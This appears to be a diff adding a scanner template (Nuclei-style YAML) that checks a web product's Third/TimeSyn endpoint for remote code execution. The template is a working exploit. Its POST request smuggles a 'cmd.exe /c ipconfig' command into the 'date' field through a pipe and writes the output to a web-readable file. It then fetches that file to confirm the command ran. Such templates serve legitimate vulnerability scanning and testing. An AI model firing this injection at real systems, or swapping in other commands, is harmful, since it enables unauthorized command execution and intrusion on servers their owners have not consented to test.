@@ -1,0 +1,37 @@
+id: yulong-Third_TimeSyn-RCE
+
+info:
+  name: yulong-Third_TimeSyn-RCE
+  author: xxx
+  severity: high
+  tags: RCE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /index.php?r=Third/TimeSyn HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+        Content-Type: application/x-www-form-urlencoded
+
+        cloudKey=0x0&date=|cmd.exe+/c+ipconfig+>+{{username}}.txt&time=1
+  - raw:
+      - |
+        GET /{{username}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'IP'
+          - 'Windows'
+        condition: and
+      - type: status
+        status: 
+          - 200
